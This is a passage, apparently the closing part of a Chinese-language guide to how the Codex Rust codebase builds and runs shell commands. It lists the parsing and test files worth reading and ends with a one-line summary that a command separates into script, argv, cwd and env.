17. `codex-rs/shell-command/src/parse_command.rs`
    - 看人类可读命令解析、Unknown fallback 与 `shlex_join()`。
18. `codex-rs/core/src/tools/runtimes/mod_tests.rs`
    - 看 snapshot quoting、override 不进入 argv、PATH 优先级的测试。
19. `codex-rs/core/src/shell_tests.rs`
    - 看不同 shell 的确切 argv 断言。
20. `codex-rs/core/src/tools/handlers/unified_exec_tests.rs`
    - 看 Direct/ZshFork、login 禁止与远程 shell mode 测试。

## 71. 一句话总结

> 一条“命令”至少要拆成 script、argv、cwd 和 env 四部分理解：Codex 先选择 shell 并构造 argv，操作系统按 argv/cwd/env 启动进程，shell 才解释引号、变量、管道和重定向；任何跨层拼接都必须明确究竟由哪一层解析。
